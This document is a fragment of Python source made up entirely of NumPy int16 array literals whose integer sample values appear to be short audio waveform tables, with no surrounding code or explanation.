np.array((31127,27529,28651,27235,27449,26975,26429,26433,25707,25617,25163,24737,24569,23979,23835,23351,22999,22751,22209,22049,21549,21231,20957,20415,20291,19725,19491,19193,18521,18873,9800,-17621,-17051,-16669,-16419,-16008,-15700,-15346,-15012,-14650,-14342,-13956,-13640,-13296,-12910,-12640,-12210,-11932,-11570,-11176,-10946,-10456,-10254,-9832,-9460,-9274,-8660,-8636,-8060,-7620,-8958,6554,7352,6510,6342,6000,5548,5322,4872,4574,4216,3842,3528,3144,2814,2458,2110,1768,1412,1068,716,366,-6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,406,748,1106,1450,1804,2154,2498,2854,3198,3550,3896,4240,4590,4936,5284,5630,5978,6324,6670,7014,7362,7706,8046,8400,8728,9082,9422,9760,10118,10438,10804,11132,11468,11836,12134,12524,12822,13172,13544,13806,14252,14490,14876,15272,15404,16118,15962,6838,-16825,-17047,-17767,-17767,-18335,-18595,-18893,-19361,-19545,-20013,-20285,-20613,-21023,-21251,-21693,-21949,-22307,-22681,-22927,-23365,-23611,-23983,-24337,-24591,-25033,-25257,-25657,-25975,-26243,-26695,-26881,-27325,-27611,-27883,-28365,-28161,-28335,-28223,-28175,-28335,-28039,-28359,-28087,-28133,-28367,-27757,-28637,-27699,-26945,), dtype=np.int16), 
np.array((22,546,1066,1583,2093,2603,3123,3630,4144,4660,5169,5679,6191,6701,7212,7716,8221,8737,9233,9730,10250,10756,11235,11761,12277,12733,13255,13804,14226,14726,15351,15729,16011,20531,-17528,-17505,-18299,-18833,-19164,-19753,-20320,-20704,-21223,-21796,-22216,-22677,-23262,-23715,-24139,-24720,-25206,-25599,-26164,-26692,-27057,-27594,-28174,-28524,-28625,-28794,-28651,-28501,-28767,-28680,-28286,-28779,-28976,-25488,28193,29072,27681,27212,27082,26298,25679,25405,24783,24117,23772,23240,22551,22141,21709,21000,20519,20180,19426,18823,19390,-17739,-17038,-16673,-16151,-15633,-15132,-14616,-14147,-13619,-13066,-12628,-12118,-11521,-11095,-10638,-9980,-9545,-9202,-8455,-7854,-9257,7442,6577,6345,5783,5176,4731,4221,3665,3167,2670,2140,1626,1116,601,-16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,), dtype=np.int16), 
np.array((694,2916,5066,7229,9421,11586,13628,15482,17145,18669,20123,21533,22866,24108,25168,25640,25980,26230,26422,26548,26590,26528,26370,26138,25856,25550,25212,24832,24406,23928,23414,22876,22324,21763,21183,20585,19965,19333,18687,18037,17385,16737,16070,15404,14740,14062,13402,12740,12080,11436,10785,10139,9511,8873,-2098,-8359,-5034,-6041,-6511,-5929,-5392,-4282,-3336,-2854,-2566,-2330,-1944,-1402,-824,-300,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,90,248,484,798,1190,1642,2134,2670,3242,3854,4510,5202,5917,6633,7351,8071,8801,9549,10299,11056,11802,12530,13242,13960,14668,15386,16094,16773,17447,18087,18717,19351,19955,20573,21169,21709,22284,22790,23298,23838,24276,24778,25226,25588,26070,26390,26746,27218,27359,27833,28115,28019,29511,-12636,-30797,-22030,-26126,-31773,-31315,-30621,-27535,-24134,-23978,-25764,-28225,-29961,-29565,-27899,-26470,-26236,-27575,-29561,-30951,-31227,-30509,-29693,-29619,-30401,-31647,-32583,-32715,-32169,-31401,-30935,-30973,-31243,-31317,-30849,-29827,-28551,-27353,-26380,-25526,-24502,-23100,-21305,-19249,-17173,-15200,-13302,-11322,-9127,-6701,-4154,-1644,), dtype=np.int16), 
np.array((12,118,332,654,1082,1596,2180,2816,3504,4252,5054,5890,6732,7574,8424,9294,10182,11072,11936,12786,13624,14460,15296,16128,16937,17707,18449,19185,19925,20651,21333,21957,22581,23213,23823,24375,24879,25389,25923,26413,26793,27109,27505,28059,28497,28489,-14410,-24693,-28031,-28595,-30971,-30851,-27111,-23947,-24447,-27437,-29739,-29585,-27659,-26201,-26771,-28927,-30853,-31211,-30305,-29537,-29959,-31333,-32531,-32695,-31955,-31133,-30905,-31187,-31317,-30729,-29437,-27941,-26687,-25665,-24489,-22813,-20587,-18135,-15768,-13528,-11206,-8586,-5676,-2688,152,2786,5312,7862,10402,12878,15122,17101,18887,20579,22213,23725,25061,25649,26035,26307,26497,26583,26537,26355,26071,25729,25349,24919,24425,23863,23251,22613,21959,21295,20593,19859,19109,18351,17585,16815,16040,15258,14474,13688,12904,12132,11382,10622,9860,9108,3142,-8316,-5384,-5714,-6378,-5760,-4422,-3328,-2774,-2502,-2148,-1572,-892,-278,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,), dtype=np.int16), 
np.array((4292,19507,30197,32507,25602,11614,-5016,-19203,-26852,-25994,-17811,-5308,7521,16965,20557,17833,10411,808,-7891,-13280,-14186,-10877,-4814,1910,7255,9819,9177,5881,1256,-3304,-6451,-7431,-6229,-3458,-118,2742,4342,4356,2964,734,-1586,-3300,-4018,-3628,-2376,-728,782,1736,1916,1368,340,-804,-1716,-2148,-2028,-1448,-620,184,748,1198,2212,3648,4816,4138,-796,-9141,-17517,-22482,-21573,-14698,-3910,7441,15966,19349,17027,10191,1296,-6827,-11876,-12696,-9517,-3674,2816,7963,10561,10141,7155,2732,-1686,-4836,-5937,-4878,-2234,1128,4152,6007,6277,5060,2862,418,-1538,-2504,-2308,-1134,568,2234,3416,3796,3350,2278,948,-234,-964,-1082,-636,174,1066,1752,2060,1918,1400,678,-30,-540,-740,-622,-272,170,850,3870,9595,16070,20229,19783,14194,4832,-5601,-14076,-18255,-17215,-11564,-3100,5436,11426,13386,10954,5208,-1852,-8005,-11478,-11458,-8255,-3110,2254,6213,7693,6497,3188,-1052,-4872,-7159,-7355,-5579,-2530,776,3334,4456,3940,2122,-374,-2724,-4230,-4508,-3574,-1798,222,1882,2730,2596,1618,172,-1244,-2238,-2526,-2074,-1074,140,1202,1816,1852,1358,532,-338,-1024,-2952,-7655,-13872,-18769,-18277,-9939,), dtype=np.int16), 
np.array((804,7310,14338,21133,26897,30939,32736,31999,28709,23117,15688,7188,-1850,-10548,-18179,-24121,-27931,-29369,-28415,-25261,-20277,-13986,-6994,56,6480,11906,15840,18017,18345,16891,13876,9654,4646,-666,-5810,-10354,-13942,-16294,-17341,-17031,-15388,-12422,-8340,-3526,1540,6350,10420,13372,14942,15028,13742,11284,7914,3964,-214,-4262,-7866,-10768,-12782,-13816,-13860,-12992,-11370,-9146,-6554,-3820,-1170,1200,3144,4544,5354,5562,5212,4384,3186,1768,224,-1478,-3858,-7158,-11296,-15918,-20515,-24455,-27321,-28511,-27751,-25011,-20381,-14222,-7042,548,7904,14412,19531,22871,24203,23493,20879,16663,11352,5326,-796,-6484,-11256,-14746,-16709,-17043,-15800,-13162,-9424,-4964,-200,4388,8528,11834,14072,15106,14920,13460,10280,5258,-1308,-8816,-16471,-23395,-28733,-31965,-32595,-30473,-25751,-18825,-10566,3966,12564,20431,26487,30281,31571,30383,26899,21525,14812,7410,-6,-6794,-12406,-16413,-18553,-18747,-17081,-13854,-9354,-4078,1472,6802,11746,16385,20735,24633,27799,29923,30709,29945,27581,23615,18269,11888,4922,-2106,-8670,-14264,-18475,-20991,-21659,-20475,-17577,-13166,-7808,-2002,3736,8928,13164,16130,17643,17649,16226,13570,9968,5832,1436,-2790,-6502,-9426,-11362,-12210,-11968,-10732,-8368,-4498,), dtype=np.int16), 
np.array((218,1454,3038,4584,6122,7646,9152,10636,12096,13528,14928,16294,17623,18909,20137,21333,22481,23577,24619,25605,26533,27401,28211,28957,29643,30263,30823,31305,31699,32033,32303,32511,32657,32742,32767,32742,32657,32521,32333,32101,31819,31493,31123,30715,30269,29789,29277,28733,28163,27567,26947,26309,25661,24989,24303,23605,22899,22185,21467,20745,20021,19299,18577,17861,17149,16451,15754,15064,14386,13718,13064,12422,11794,11180,10582,9998,9430,8882,8346,7826,7320,6830,6358,5898,5456,5026,4610,4210,3820,3442,3078,2722,2374,2036,1706,1380,1060,744,432,124,-182,-492,-800,-1108,-1424,-1742,-2066,-2396,-2736,-3080,-3434,-3800,-4176,-4564,-4964,-5370,-5796,-6238,-6694,-7164,-7648,-8150,-8668,-9202,-9752,-10318,-10900,-11496,-12100,-12728,-13370,-14026,-14694,-15374,-16068,-16771,-17477,-18185,-18897,-19611,-20329,-21039,-21755,-22467,-23173,-23873,-24561,-25239,-25899,-26547,-27173,-27777,-28359,-28907,-29433,-29925,-30387,-30809,-31195,-31537,-31837,-32091,-32295,-32451,-32553,-32601,-32593,-32529,-32407,-32223,-31979,-31673,-31303,-30871,-30375,-29815,-29193,-28509,-27761,-26961,-26093,-25163,-24177,-23133,-22043,-20901,-19711,-18475,-17195,-15874,-14514,-13140,-11714,-10262,-8784,-7286,-5770,-4238,-2698,-1138,), dtype=np.int16), 
np.array((1691,6472,10718,14704,18245,21524,24443,27033,29260,31112,32198,32721,30817,27695,25609,23823,22276,20852,19542,18292,17126,16002,14943,13918,12935,11984,11067,10178,9315,8478,7674,6883,6113,5361,4626,3912,3216,2536,1871,1221,589,-28,-623,-1213,-1791,-2355,-2907,-3444,-3968,-4482,-4981,-5471,-5946,-6352,-6689,-6998,-7285,-7547,-7786,-8001,-8196,-8366,-8565,-8866,-9159,-9443,-9718,-9983,-10236,-10485,-10722,-10954,-11175,-11388,-11590,-11787,-11974,-12150,-12321,-12481,-12630,-12774,-12906,-13033,-13151,-13262,-13362,-13450,-13536,-13609,-13679,-13733,-13787,-13821,-13859,-13878,-13902,-13902,-13894,-6418,658,5804,9652,13330,16510,19287,21608,23600,25185,26425,27262,27762,26572,23743,21911,20374,19028,17802,16664,15615,14606,13653,12738,11863,11020,10208,9421,8663,7925,7208,6512,5844,5184,4544,3918,3308,2712,2130,1562,1011,469,-56,-569,-1075,-1560,-2042,-2511,-2971,-3416,-3854,-4281,-4696,-5102,-5501,-5884,-6261,-6627,-6982,-7327,-7664,-7993,-8314,-8621,-8922,-9213,-9496,-9769,-10033,-10288,-10531,-10768,-10998,-11217,-11428,-11628,-11821,-12008,-12182,-12353,-12507,-12662,-12800,-12937,-13051,-13175,-13278,-13380,-13466,-13553,-13623,-13687,-13747,-13787,-13839,-13851,-13902,-13870,-13958,-13681,-4666,), dtype=np.int16), 
np.array((16,4980,9982,14798,19385,23505,27003,29735,31573,32455,32758,32726,32673,32597,32497,32369,32207,32011,31781,31511,31201,30851,30457,30017,29537,29007,28433,27813,27151,26437,25677,24869,24015,23117,22171,21183,20153,19079,17967,16815,15626,14416,13160,11872,10554,9208,7838,6444,5032,3604,2158,702,-762,-2206,-3616,-4980,-6292,-7552,-8756,-9904,-10990,-12016,-12970,-14146,-15298,-16427,-17517,-18589,-19627,-20635,-21603,-22535,-23425,-24275,-25077,-25835,-26547,-27207,-27819,-28371,-28875,-29327,-29721,-30061,-30343,-30567,-30735,-30841,-30889,-30877,-30693,-30143,-29095,-27465,-25221,-22361,-18911,-14942,-10542,-5824,-922,4010,8834,13390,17481,21069,23985,26131,27431,27845,27827,27799,27757,27695,27613,27503,27369,27207,27011,26783,26521,26223,25889,25519,25107,24657,24169,23637,23067,22463,21815,21123,20393,19625,18817,17973,17091,16170,15220,14232,13216,12170,11104,10002,8874,7722,6550,5356,4148,2926,1690,444,-806,-2066,-3328,-4574,-5832,-7088,-8334,-9572,-10796,-12004,-13196,-14366,-15516,-16639,-17735,-18801,-19823,-20821,-21783,-22707,-23591,-24431,-25225,-25977,-26675,-27327,-27929,-28475,-28965,-29407,-29791,-30121,-30389,-30605,-30759,-30855,-30891,-30863,-30619,-29975,-28811,-27087,-24723,-21747,-18197,-14134,-9664,-4902,), dtype=np.int16), 
np.array((136,1626,2950,4144,5234,6254,7224,8158,9052,9884,10634,11308,11910,12508,13110,13708,14270,14746,15114,15386,15618,15878,16216,16609,16981,17157,17017,16328,5238,-23189,-20567,-18043,-15590,-13222,-11028,-9062,-7334,-5836,-4402,-3008,-1626,-282,970,2078,3034,3868,4616,5304,5932,6490,6956,7322,7592,7790,7930,8020,8060,8042,7962,6756,5440,4438,3602,2884,2242,1666,1178,770,442,184,-4,-130,-200,-220,-198,-134,-30,112,296,516,770,1044,1330,1626,1936,2268,2632,3030,3438,3822,4146,4386,4462,-6648,-11334,-10246,-9230,-8230,-7266,-6352,-5496,-4706,-3916,-3116,-2292,-1452,-622,180,950,1688,2414,3128,3836,4496,5078,5618,6114,6570,6992,7382,7734,8040,8290,8456,7326,6126,5192,4372,3618,2910,2230,1570,932,316,-270,-838,-1380,-1882,-2358,-2796,-3212,-3592,-3944,-4266,-4560,-4824,-5058,-5266,-5444,-5596,-5718,-5808,-5874,-5910,-5918,-5916,-5914,-5910,-5908,-5906,-5902,-5900,-5896,-5894,-5892,-5888,-5886,-5884,-5878,-5876,-5874,-5868,-5866,-5864,-5860,-5860,-5858,-5852,-5848,-5846,-5842,-5840,-5840,-5838,-5836,-5826,-5820,-5814,-5816,-5822,-5826,-5822,-5810,-5796,-5782,-5780,-5794,-5816,-3782,-1568,), dtype=np.int16), 
np.array((204,1430,2628,3786,4892,5978,7018,8008,8964,9870,10718,11524,12274,12972,13604,14194,14720,15170,15576,15932,16190,16338,16971,17539,16975,15680,15446,15280,15054,14762,14410,13996,13522,12994,12408,11762,11064,10316,9514,8662,7758,6812,5832,4794,3714,2594,1436,250,-974,-2226,-3502,-4802,-6122,-7472,-8668,-9790,-10916,-12040,-13152,-14250,-15332,-16403,-17449,-18481,-19489,-20465,-21393,-22261,-23065,-23817,-24509,-25129,-25691,-26171,-26581,-26913,-27167,-27339,-27431,-27435,-27359,-27199,-26953,-26623,-26213,-25721,-25151,-24501,-23783,-22995,-22135,-21213,-20235,-19217,-18133,-17007,-15838,-14632,-13402,-12146,-10878,-9602,-8318,-7050,-5788,-4546,-3352,-2176,-1046,28,1050,2004,2888,3694,4420,5060,5614,6074,6436,6708,6884,6964,6948,6834,6628,6330,5938,5454,4886,4236,3504,2706,1828,880,-128,-1196,-2318,-3480,-4686,-5924,-7190,-8476,-9776,-11086,-12382,-13688,-14982,-16264,-17529,-18765,-19967,-21141,-22269,-23363,-24405,-25401,-26333,-27221,-28051,-28819,-29521,-30163,-30729,-31229,-31655,-32007,-32285,-32509,-32732,-32477,-32199,-31861,-31459,-31009,-30505,-29945,-29341,-28689,-27987,-27253,-26113,-24929,-23729,-22475,-21205,-19907,-18585,-17251,-15894,-14530,-13162,-11788,-10406,-9032,-7680,-6320,-4976,-3650,-2336,-1052,), dtype=np.int16), 
np.array((258,1408,670,2334,3878,3558,5500,5484,6350,8230,7444,7970,10508,13292,14742,14520,17299,20035,20419,21759,22081,25155,28269,27099,27179,27681,27141,29505,31085,31911,31969,30587,30115,29725,29947,29495,29367,29509,26787,23791,21691,19257,18911,18251,15492,13100,9734,6270,4538,2004,404,-1492,-4654,-7484,-10806,-13290,-15604,-17171,-18861,-21123,-23167,-25545,-26933,-27909,-29483,-30293,-30995,-32021,-32073,-32479,-32657,-31817,-31225,-30131,-29195,-28387,-26575,-24893,-22695,-20603,-19271,-17229,-15590,-13590,-11554,-9864,-7884,-6442,-5372,-4262,-3570,-2234,-962,-198,298,262,-216,-204,-380,-656,-1070,-1614,-2196,-3176,-4020,-4970,-5370,-5420,-5962,-6122,-6990,-7520,-7550,-8076,-7800,-7822,-7782,-7276,-6874,-6600,-5856,-5578,-4742,-3730,-3400,-2804,-2484,-1932,-1408,-998,-300,-30,560,924,1316,2078,2304,2806,3308,3234,3910,4530,4722,5760,5154,6056,7122,6594,7304,6832,6962,7538,7170,7496,6568,6042,6026,5594,5534,4374,3972,2800,1338,834,-32,-178,-896,-1470,-2120,-4034,-4730,-4724,-4902,-4634,-4562,-4632,-4832,-5344,-5896,-4988,-4386,-3930,-3490,-3428,-3710,-3898,-2854,-2226,-2158,-1502,-1820,-956,-1450,-1540,-1154,-1478,-1234,-2534,-1730,-958,), dtype=np.int16), 
np.array((134,473,4684,9905,4386,9873,3295,837,2729,7875,11740,15960,23776,19690,23587,25287,22731,13970,8088,1287,-9641,-13978,-18338,-21176,-27936,-31744,-32767,-27783,-21869,-18519,-10892,-11236,-11498,-5838,4080,11303,8084,11887,9826,10529,11259,7293,-1522,-14008,-16103,-16094,-13315,-11571,-14785,-16812,-20590,-17996,-15212,-20499,-18812,-16034,-8177,-4825,3941,8181,7915,3546,6322,6346,11669,10568,6680,8012,11635,17299,18193,19704,18860,13214,15935,12131,10900,2630,-9053,-23120,-28125,-24014,-17907,-14646,-7480,-5986,4467,8445,6852,-269,-1689,-3274,1421,2852,7412,9647,19122,11968,6835,4376,-1053,-6523,-18856,-16959,-23744,-14670,-15404,-13994,-13893,-6686,-7325,-11398,-11420,-8088,-4106,1585,4042,10219,12616,12032,6098,2370,2076,-1710,1484,-4064,7250,6773,10664,6944,11126,14789,8173,4997,-1405,-1581,-1478,1426,6731,4984,4741,3113,326,1506,-6568,-6952,-11071,-5931,-2956,2296,6346,13148,17809,20435,12276,12783,9792,7834,1758,-1695,-4674,-6378,1222,-6282,-16256,-17780,-8537,-20399,-24767,-13426,-2481,-6207,-2294,6785,8487,8370,6235,3242,36,1337,6966,4139,10638,5780,10374,11252,13935,6833,6181,6827,9828,6459,7333,3963,-1156,-5675,-3832,-9130,-2525,-1158,), dtype=np.int16), 
np.array((1278,5366,7216,5866,6180,9950,13198,10526,8538,9852,9958,11914,16290,21299,22017,21185,26827,31849,32179,28673,27571,28811,28147,28057,27085,24929,21759,21661,20543,20275,16383,10892,7224,102,-1338,-3962,-5846,-6478,-8256,-4652,-7586,-9088,-11172,-9116,-7322,-13480,-13278,-15040,-15926,-17735,-17935,-12958,-12240,-10704,-4316,772,5032,7086,8208,10624,10586,13154,13940,10940,9122,10222,10638,7808,7246,7734,5970,5004,6536,5232,1078,-418,-2308,-1394,-4296,-7432,-6910,-11196,-10602,-8320,-9544,-11432,-13750,-13952,-11700,-13212,-12360,-6550,-4928,-7516,-10474,-7722,-2006,-2140,-2786,-1856,230,-2540,-586,5716,6806,4774,2728,7738,7940,6902,7692,7674,6472,3204,4436,3488,1114,1566,1200,16,-4582,-3976,-2998,-5498,-7032,-7696,-5746,-6744,-8240,-9870,-10714,-12428,-11756,-13682,-16409,-16621,-18111,-14622,-18265,-17039,-17035,-18253,-16216,-19009,-15012,-11378,-9398,-9908,-11434,-10074,-7112,-1852,-684,1340,2398,3914,8806,12936,19481,20385,21209,27125,31517,32521,29025,27255,26245,25419,23465,21487,17911,12236,11484,8462,3756,-1408,-4428,-8874,-14530,-18495,-23149,-22785,-24909,-27545,-25645,-28141,-24141,-22553,-24711,-23979,-25213,-24619,-23291,-22219,-22093,-19263,-20747,-16062,-8790,-5218,), dtype=np.int16), 
np.array((50,5627,8986,6016,6852,7037,7372,8417,10807,12377,14882,16984,22034,25351,26163,28061,27900,27722,26222,24021,23055,20269,19028,18260,15969,14826,15715,13625,9379,5232,1480,2344,-792,-4361,-6606,-10899,-13418,-12027,-11469,-12682,-14537,-17271,-16810,-17734,-19399,-20779,-23043,-27351,-30610,-31219,-31364,-30553,-30894,-26576,-21170,-18783,-17317,-14154,-9776,-6648,-6287,-5557,-5057,-4231,-3730,-2681,1375,2071,5192,8306,12325,15356,15665,18966,19884,21136,20418,19317,20694,19393,23147,22140,23767,26813,25738,26270,21210,20813,19730,17818,15592,11120,9219,5172,4857,6758,8419,8635,5073,7324,5483,4506,3678,-483,-3718,-10053,-14796,-15977,-18025,-19387,-19599,-20979,-19058,-17758,-17365,-15650,-16635,-15199,-14860,-16750,-15083,-17269,-19024,-17203,-17427,-13888,-13775,-15125,-10835,-10847,-10683,-6824,-8447,-5751,-4578,-4041,280,2238,6461,13473,19565,19912,20682,20809,23071,26053,22740,21815,19493,16553,16104,18410,20867,21912,22497,25054,28026,27467,27882,27962,25818,20961,16427,12981,9429,6708,4267,1375,-3048,-2861,-2222,-4105,-7855,-12722,-13031,-14064,-16541,-16725,-19690,-23981,-24088,-24132,-22120,-22748,-26683,-25742,-28438,-29673,-28273,-29039,-29495,-32196,-31558,-28275,-23187,-18669,-13332,-7879,-8505,-3553,), dtype=np.int16), 
np.array((1044,4886,7712,12316,19141,21995,21657,20211,15204,13940,10860,9004,8268,7962,13460,22701,27793,32001,31963,32625,28521,21999,14718,7936,1870,-1454,-1060,224,8176,19103,25907,29013,29121,28485,27967,21161,14636,4610,-3360,-4358,-3988,-658,4768,14412,20805,23441,21391,19767,18147,11078,4318,-5814,-12012,-12088,-9394,-5940,-1896,414,6808,10386,9626,6504,-160,-5168,-11688,-18401,-21837,-21501,-18199,-13142,-8638,-6080,-3044,-1048,-2748,-7616,-15944,-22005,-26397,-29097,-29267,-27771,-23501,-17187,-11412,-6990,-4440,-4100,-5616,-9798,-16058,-21597,-24819,-25047,-23555,-21299,-17741,-12616,-7354,-4534,-3884,-6392,-9262,-13366,-17331,-20479,-22241,-20591,-17305,-12558,-7302,-2158,2622,5126,5046,2578,-786,-4454,-7584,-9960,-10362,-8694,-5338,-1366,2606,5120,5442,4220,1278,-2266,-6692,-9908,-11760,-12044,-10150,-6610,-1912,2276,4818,7120,7282,6234,4270,1306,-1478,-3574,-2982,-1850,-226,1468,2956,4074,3658,3772,2640,794,-1322,-3732,-5436,-5788,-4656,-3254,-1944,-246,1538,2938,3374,2340,2096,106,-1650,-3432,-4416,-3498,-3436,-1520,-1104,-340,-138,58,-72,-1420,-3440,-4740,-3716,-1466,2122,3492,6896,9218,10914,12214,10020,7854,5408,1150,366,-3070,-3140,-776,), dtype=np.int16), 
np.array((208,2694,4022,5846,8272,11526,16276,19207,20641,23005,26147,29863,32457,32750,32301,32053,31913,31969,30871,29273,26583,23291,20741,19457,17793,14868,12210,9324,7790,6784,5512,3586,456,-1990,-4226,-4570,-6970,-9402,-11842,-14636,-16158,-18611,-20567,-23791,-25455,-28487,-29969,-30591,-31793,-30303,-31467,-30043,-28525,-28819,-26845,-26033,-22591,-20033,-18347,-17365,-16342,-14080,-12680,-9150,-7958,-5516,-2648,1504,7738,12450,16939,18677,20195,23649,26863,28653,28139,28497,28529,27825,28107,28371,28513,27109,25851,26747,26729,26211,25825,24179,22305,19905,18555,17485,15584,12968,9898,7334,4732,2346,-1360,-6968,-11988,-15134,-18055,-21413,-24313,-27571,-29957,-30671,-31485,-30141,-30615,-30663,-30645,-30079,-28351,-27023,-26085,-27557,-26213,-25319,-23893,-21835,-22339,-20107,-17383,-13712,-7554,-2848,518,1316,3278,7534,11992,12786,12758,13818,14282,16194,18283,20645,21945,21739,23307,26457,28095,29251,29541,29669,29547,29181,30827,31099,30141,27617,24963,23133,21693,20139,15634,11402,5770,2058,104,-3722,-7398,-11930,-14632,-15716,-16401,-18129,-19649,-21853,-23711,-22841,-21737,-21709,-22821,-25565,-25593,-24533,-24007,-24011,-25309,-26893,-26857,-24035,-20497,-18235,-17081,-17547,-16393,-13974,-10716,-6940,-6344,-6836,-4832,-2342,), dtype=np.int16), 
np.array((890,4996,8960,12768,16361,19643,22649,25301,27563,29423,30865,31897,32527,32767,32655,32209,31469,30471,29271,27877,26343,24701,22991,21243,19487,17747,16042,14394,12816,11320,9918,8628,7424,6324,5328,4436,3646,2950,2348,1834,1400,1044,754,528,354,224,132,72,34,10,-8,-30,-64,-116,-196,-310,-462,-668,-928,-1250,-1644,-2110,-2658,-3288,-4008,-4818,-5724,-6726,-7818,-8992,-10264,-11620,-13052,-14546,-16092,-17675,-19269,-20857,-22415,-23911,-25317,-26587,-27715,-28651,-29363,-29815,-29977,-29821,-29327,-28473,-27255,-25667,-23717,-21419,-18833,-15926,-12770,-9414,-5912,-2322,1290,4868,8348,11674,14790,17649,20213,22423,24313,25841,26999,27795,28239,28351,28153,27653,26981,26083,25001,23781,22429,20991,19497,17975,16449,14944,13472,12056,10702,9462,8298,7212,6222,5306,4474,3726,3064,2480,1974,1540,1174,874,630,436,290,184,108,60,28,10,-2,-20,-48,-94,-166,-270,-416,-606,-852,-1160,-1536,-1986,-2518,-3136,-3846,-4650,-5552,-6554,-7660,-8866,-10154,-11550,-13034,-14594,-16222,-17897,-19601,-21311,-23005,-24647,-26211,-27659,-28951,-30039,-30913,-31515,-31813,-31773,-31365,-30569,-29369,-27755,-25733,-23315,-20525,-17431,-14002,-10326,-6458,-2450,), dtype=np.int16), 
np.array((353,2367,3611,5027,4442,2568,3651,4263,10109,10514,9764,11125,7965,11556,13448,10508,17911,12312,16738,16250,12599,17344,13107,15096,18969,15777,20034,18201,13477,20890,15698,22580,27464,21796,25173,19087,20784,25421,27124,29150,28488,28807,32767,27748,28841,27094,26811,27606,26915,29585,30766,30489,24509,20597,19140,18640,21164,20481,16385,22505,15198,20556,10136,7226,13794,10209,22052,18935,13513,15123,5370,8585,8912,8882,14751,6630,7317,3871,3180,2910,-1083,-690,-1219,1062,-4708,-1912,-7902,-6537,-5216,-9967,-7545,-10796,-5868,-9355,-10347,-11715,-13751,-11906,-14775,-13920,-13462,-12497,-12503,-16279,-17695,-19075,-16065,-15919,-14680,-14401,-15649,-14710,-18268,-18215,-18868,-17653,-16293,-17336,-17677,-17498,-17907,-19059,-20829,-19654,-18169,-16224,-17972,-18847,-18374,-18283,-16141,-17630,-17748,-16785,-16708,-15958,-17429,-17581,-16679,-16246,-15454,-18500,-17640,-14942,-15003,-12471,-15253,-15123,-15407,-14537,-14763,-13877,-12164,-10619,-10556,-9685,-11479,-9965,-10861,-11664,-9433,-10024,-5112,-8319,-6181,-7577,-8750,-7025,-8986,-6982,-5228,-4643,-4749,-5992,-8896,-8910,-9709,-8715,-7630,-6659,-5616,-5421,-7149,-6671,-6850,-5793,-2686,-2678,-459,-170,-1983,-1018,-1871,-1351,-60,-113,-1969,-1349,-2131,-1294,), dtype=np.int16), 
np.array((143,238,2010,6576,7234,12509,11349,12327,9168,8840,5483,1783,8550,7765,13084,12908,5537,7866,1895,5805,8783,4847,13495,10644,17893,13370,14238,18375,11193,21997,18104,25332,32767,24119,29969,19796,24140,29376,25025,27762,22376,27624,26055,25150,23613,19491,22631,16891,20001,21631,17166,21432,16350,13527,14840,8961,20112,20533,18675,20539,16682,15728,18563,14823,18909,24474,21360,24113,23170,16251,23617,15862,14143,19466,16146,24176,15747,16834,11774,9512,10614,2670,8791,3146,8980,8247,2846,2466,-8354,-1259,-8972,-5339,-8184,-8170,-2433,-3035,-2873,-5422,-9575,-8611,-6161,-3997,2812,1791,2004,-1455,-4778,-3865,-7380,-2522,-4804,-4566,-5467,-7352,-9071,-13580,-13341,-17417,-15909,-19215,-19817,-15542,-19487,-16095,-19400,-24895,-18614,-22226,-16666,-16162,-15028,-12363,-13918,-10434,-12481,-8073,-9905,-8662,-6941,-12130,-8502,-13918,-12392,-12106,-14829,-12653,-16385,-17494,-17249,-19881,-19855,-21900,-21841,-22275,-17721,-16832,-15315,-17855,-19794,-18997,-19238,-15002,-19138,-13669,-13455,-11486,-11663,-19199,-14862,-19173,-15435,-15745,-15587,-13414,-15129,-10529,-11729,-7200,-10614,-9557,-10701,-11748,-9968,-12618,-7599,-11039,-10474,-10539,-16447,-12841,-18721,-11104,-11675,-10816,-10229,-12993,-6019,-5463,1054,-3077,), dtype=np.int16), 
np.array((4016,3531,4863,13993,25159,27765,30923,30379,26726,24388,20735,15931,7019,-1382,-6706,-12528,-11921,-11204,-10640,-8932,-8186,-5651,-2838,-192,1832,-514,-2216,-6195,-10147,-11620,-14224,-14879,-16615,-17585,-15409,-12118,-6999,-4028,-2268,0,1482,4855,6925,9040,10658,9504,8635,6919,5183,3395,-80,-5816,-10388,-13251,-14527,-15200,-11789,-8829,-7515,-5076,-4791,-3240,413,9157,13229,9336,5912,1896,492,233,1579,-2676,-4833,-4825,-2408,4032,17732,25306,25669,25378,23038,22519,21900,20153,14384,5828,146,-4558,-4924,-4227,-3785,-6252,-9954,-10571,-8645,-7220,-4693,-6117,-8488,-9723,-10236,-7256,-3630,-902,-986,-1934,-2222,-2575,-3003,-4916,-8972,-13561,-16550,-15381,-14055,-12506,-10400,-8112,-5237,-2525,-110,2850,1745,592,1370,-988,1546,2643,4357,7130,7564,9127,12813,22543,27893,26381,23542,14931,7712,3395,2083,-3791,-11397,-15035,-16876,-15303,-9201,-3833,-618,-291,2151,4825,5028,5659,3001,-2089,-4604,-5512,-4689,-3047,225,2113,2113,4584,10157,13442,14304,11887,7086,1430,-2722,-4950,-8140,-10951,-12259,-13605,-12852,-10336,-6376,-4793,-6210,-5958,-6222,-5545,-5448,-5830,-7670,-8779,-7415,-6664,-5267,-3582,-4520,-3136,1782,2943,2822,2027,1217,2230,), dtype=np.int16), 
